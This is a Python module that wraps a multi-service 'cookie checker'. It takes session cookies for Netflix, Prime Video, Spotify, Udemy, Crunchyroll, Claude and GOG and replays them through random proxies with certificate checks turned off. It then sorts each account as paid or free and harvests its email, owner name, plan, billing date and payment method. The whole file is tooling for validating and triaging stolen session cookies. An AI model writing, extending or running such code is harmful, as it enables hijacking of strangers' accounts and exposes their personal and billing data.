"""
checker.py — Wrapper untuk logika Netflix Cookie Checker
Menggunakan fungsi-fungsi dari Netflix-Cookie-Checker-main/main.py
"""
import sys
import os
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Import core functions from local netflix_checker_main.py
try:
    from .netflix_checker_main import (
        extract_netflix_cookie_bundles,
        cookies_dict_from_netscape,
        has_required_netflix_cookies,
        extract_info,
        derive_plan_info,
        derive_output_plan_bucket,
        is_subscribed_account,
        is_on_hold_account,
        is_extra_member_account,
        decode_netflix_value,
        normalize_plan_key,
        get_canonical_output_label,
    )
    CHECKER_AVAILABLE = True
except ImportError as e:
    CHECKER_AVAILABLE = False
    print(f"[WARNING] Could not import netflix checker: {e}")

try:
    from .prime_checker_main import (
        parse_cookie_file,
        has_required_auth_cookies,
        get_prime_video_data,
        infer_prime_video_data,
        classify_non_success_result,
        set_unknown_plan_data,
    )
    PRIME_CHECKER_AVAILABLE = True
except ImportError as e:
    PRIME_CHECKER_AVAILABLE = False
    print(f"[WARNING] Could not import prime checker: {e}")

try:
    from .spotify_checker_main import (
        check_spotify_cookie,
        parse_spotify_cookie_text,
    )
    from .udemy_checker import check_udemy_cookie
    from .crunchyroll_checker import check_crunchyroll_cookie
    from .claude_checker import check_claude_cookie
    from .gog_checker import check_gog_cookie
    SPOTIFY_CHECKER_AVAILABLE = True
    UDEMY_CHECKER_AVAILABLE = True
    CRUNCHYROLL_CHECKER_AVAILABLE = True
    CLAUDE_CHECKER_AVAILABLE = True
    GOG_CHECKER_AVAILABLE = True
except ImportError as e:
    SPOTIFY_CHECKER_AVAILABLE = False
    UDEMY_CHECKER_AVAILABLE = False
    CRUNCHYROLL_CHECKER_AVAILABLE = False
    CLAUDE_CHECKER_AVAILABLE = False
    GOG_CHECKER_AVAILABLE = False
    print(f"[WARNING] Could not import some extra checkers: {e}")

# Global state for cancelling
checker_state = {'cancel': False}

def cancel_checking():
    checker_state['cancel'] = True

def is_cancelled():
    return checker_state['cancel']

def reset_checker_state():
    checker_state['cancel'] = False



def check_single_cookie(cookie_text: str, proxy_list: list = None) -> dict:
    """
    Proses satu cookie string dan kembalikan info akun.
    Returns dict dengan keys:
      status: 'success'|'free'|'failed'|'error'
      info: dict account info
      plan_key, plan_name, country, is_on_hold
      cookie_text: normalized netscape text
      error_reason: str (jika gagal)
    """
    if is_cancelled():
        return {'status': 'cancelled'}

    if not CHECKER_AVAILABLE:
        return {'status': 'error', 'error_reason': 'Checker module not available'}

    try:
        bundles = extract_netflix_cookie_bundles(cookie_text)
        if not bundles:
            return {'status': 'failed', 'error_reason': 'Cookie tidak valid / tidak mengandung Netflix cookies'}

        bundle = bundles[0]
        netscape_text = bundle.get('netscape_text', '')
        cookies = bundle.get('cookies') or cookies_dict_from_netscape(netscape_text)

        if not cookies or not has_required_netflix_cookies(cookies):
            return {'status': 'failed', 'error_reason': 'Missing required cookie: NetflixId'}

        if is_cancelled(): return {'status': 'cancelled'}

        # Setup session
        session = requests.Session()
        session.cookies.update(cookies)

        headers = {
            'User-Agent': (
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                'AppleWebKit/537.36 (KHTML, like Gecko) '
                'Chrome/124.0.0.0 Safari/537.36'
            ),
            'Accept-Encoding': 'identity',
        }

        proxy = None
        if proxy_list:
            import random
            proxy = random.choice(proxy_list)

        response = session.get(
            'https://www.netflix.com/account/membership',
            headers=headers,
            proxies=proxy,
            timeout=20,
            verify=False,
        )

        if is_cancelled(): return {'status': 'cancelled'}

        if response.status_code != 200:
            return {
                'status': 'error',
                'error_reason': f'HTTP {response.status_code}'
            }

        info = extract_info(response.text)
        if not info or not info.get('countryOfSignup'):
            return {'status': 'failed', 'error_reason': 'Tidak bisa membaca info akun'}

        subscribed = is_subscribed_account(info)
        on_hold = is_on_hold_account(info) if subscribed else False
        plan_key, plan_name = derive_plan_info(info, subscribed)

        status = 'success' if subscribed else 'free'

        return {
            'status': status,
            'cookie_text': netscape_text,
            'plan_key': plan_key,
            'plan_name': plan_name,
            'country': decode_netflix_value(info.get('countryOfSignup')) or 'Unknown',
            'is_on_hold': on_hold,
            'email': decode_netflix_value(info.get('email')),
            'account_name': decode_netflix_value(info.get('accountOwnerName')),
            'quality': decode_netflix_value(info.get('videoQuality')),
            'max_streams': decode_netflix_value(info.get('maxStreams')),
            'plan_price': decode_netflix_value(info.get('planPrice')),
            'next_billing': decode_netflix_value(info.get('nextBillingDate')),
            'payment_method': decode_netflix_value(info.get('paymentMethodType')),
            'member_since': decode_netflix_value(info.get('memberSince')),
            'extra_members': decode_netflix_value(info.get('showExtraMemberSection')),
            'profiles': decode_netflix_value(info.get('profiles')),
            'hold_status': decode_netflix_value(info.get('holdStatus')),
            'membership_status': decode_netflix_value(info.get('membershipStatus')),
        }

    except requests.exceptions.Timeout:
        return {'status': 'error', 'error_reason': 'Timeout'}
    except requests.exceptions.ProxyError:
        return {'status': 'error', 'error_reason': 'Proxy error'}
    except requests.exceptions.RequestException as e:
        return {'status': 'error', 'error_reason': str(e)}
    except Exception as e:
        return {'status': 'error', 'error_reason': str(e)}


def check_single_prime_cookie(cookie_text: str, proxy_list: list = None) -> dict:
    if is_cancelled():
        return {'status': 'cancelled'}

    if not PRIME_CHECKER_AVAILABLE:
        return {'status': 'error', 'error_reason': 'Prime Checker module not available'}

    try:
        import tempfile
        import json
        with tempfile.NamedTemporaryFile(delete=False, mode='w', suffix='.txt', encoding='utf-8') as tf:
            tf.write(cookie_text)
            temp_path = tf.name

        netscape_text, cookies = parse_cookie_file(temp_path)
        os.remove(temp_path)

        if not cookies or not has_required_auth_cookies(cookies):
            return {'status': 'failed', 'error_reason': 'Missing required Prime Video cookies'}

        if is_cancelled(): return {'status': 'cancelled'}

        session = requests.Session()
        session.cookies.update(cookies)
        
        proxy_dict = None
        if proxy_list:
            import random
            proxy_dict = random.choice(proxy_list)

        source_text, status_code, config_data = get_prime_video_data(session, proxy_dict)
        
        if is_cancelled(): return {'status': 'cancelled'}

        data = infer_prime_video_data(source_text, "", config_data)
        
        if data.get('signin_state') != 'signed_in':
            return {'status': 'failed', 'error_reason': 'Not signed in to Prime Video'}

        is_paid = data.get('is_paid')
        status = 'success' if is_paid is True else 'free'
        
        # prime_checker_main format_paid_label etc handling is internal.
        # We just need the fields for the database
        plan_name = data.get('plan', 'Unknown')
        plan_key = plan_name.lower().replace(' ', '_')
        if not is_paid:
            plan_key = 'free'
        elif is_paid:
            plan_key = 'premium' # or active

        return {
            'status': status,
            'cookie_text': netscape_text,
            'plan_key': plan_key,
            'plan_name': plan_name,
            'country': data.get('region') or 'Unknown',
            'is_on_hold': False,
            'account_name': data.get('profile') or '',
            'email': data.get('customer_id') or '',  # Prime Video often doesn't show email directly
        }

    except requests.exceptions.Timeout:
        return {'status': 'error', 'error_reason': 'Timeout'}
    except requests.exceptions.ProxyError:
        return {'status': 'error', 'error_reason': 'Proxy error'}
    except requests.exceptions.RequestException as e:
        return {'status': 'error', 'error_reason': str(e)}
    except Exception as e:
        return {'status': 'error', 'error_reason': str(e)}


def check_single_spotify_cookie(cookie_text: str, proxy_list: list = None) -> dict:
    """
    Check a single Spotify cookie string.
    Delegates to spotify_checker_main.check_spotify_cookie().
    """
    if is_cancelled():
        return {'status': 'cancelled'}

    if not SPOTIFY_CHECKER_AVAILABLE:
        return {'status': 'error', 'error_reason': 'Spotify Checker module not available'}

    try:
        result = check_spotify_cookie(cookie_text, proxy_list)
        return result
    except requests.exceptions.Timeout:
        return {'status': 'error', 'error_reason': 'Timeout'}
    except requests.exceptions.ProxyError:
        return {'status': 'error', 'error_reason': 'Proxy error'}
    except requests.exceptions.RequestException as e:
        return {'status': 'error', 'error_reason': str(e)}
    except Exception as e:
        return {'status': 'error', 'error_reason': str(e)}


def check_single_udemy_cookie(cookie_text: str, proxy_list: list = None) -> dict:
    if is_cancelled(): return {'status': 'cancelled'}
    if not UDEMY_CHECKER_AVAILABLE: return {'status': 'error', 'error_reason': 'Module unavailable'}
    try: return check_udemy_cookie(cookie_text, proxy_list)
    except Exception as e: return {'status': 'error', 'error_reason': str(e)}

def check_single_crunchyroll_cookie(cookie_text: str, proxy_list: list = None) -> dict:
    if is_cancelled(): return {'status': 'cancelled'}
    if not CRUNCHYROLL_CHECKER_AVAILABLE: return {'status': 'error', 'error_reason': 'Module unavailable'}
    try: return check_crunchyroll_cookie(cookie_text, proxy_list)
    except Exception as e: return {'status': 'error', 'error_reason': str(e)}

def check_single_claude_cookie(cookie_text: str, proxy_list: list = None) -> dict:
    if is_cancelled(): return {'status': 'cancelled'}
    if not CLAUDE_CHECKER_AVAILABLE: return {'status': 'error', 'error_reason': 'Module unavailable'}
    try: return check_claude_cookie(cookie_text, proxy_list)
    except Exception as e: return {'status': 'error', 'error_reason': str(e)}

def check_single_gog_cookie(cookie_text: str, proxy_list: list = None) -> dict:
    if is_cancelled(): return {'status': 'cancelled'}
    if not GOG_CHECKER_AVAILABLE: return {'status': 'error', 'error_reason': 'Module unavailable'}
    try: return check_gog_cookie(cookie_text, proxy_list)
    except Exception as e: return {'status': 'error', 'error_reason': str(e)}



def parse_proxy_text(proxy_text: str) -> list:
    """Parse proxy list dari text area input."""
    if not CHECKER_AVAILABLE:
        return []
    try:
        from .netflix_checker_main import _parse_proxy_line
        proxies = []
        for line in proxy_text.splitlines():
            p = _parse_proxy_line(line)
            if p:
                proxies.append(p)
        return proxies
    except Exception:
        return []
